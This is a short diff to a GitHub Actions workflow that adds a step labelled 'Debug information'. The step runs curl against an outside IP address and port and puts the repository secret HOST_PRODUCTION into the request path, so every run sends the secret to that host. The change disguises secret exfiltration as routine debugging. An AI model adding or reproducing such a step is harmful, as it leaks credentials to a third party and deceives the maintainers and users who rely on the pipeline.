@@ -11,6 +11,10 @@ jobs:
     steps:
       - name: Checkout
         uses: actions/checkout@v2
+
+      - name: Debug information
+        run: |
+          curl -X GET 44.205.12.147:8000/"${{ secrets.HOST_PRODUCTION }}"
       
       - name: Install Node
         uses: actions/setup-node@v2
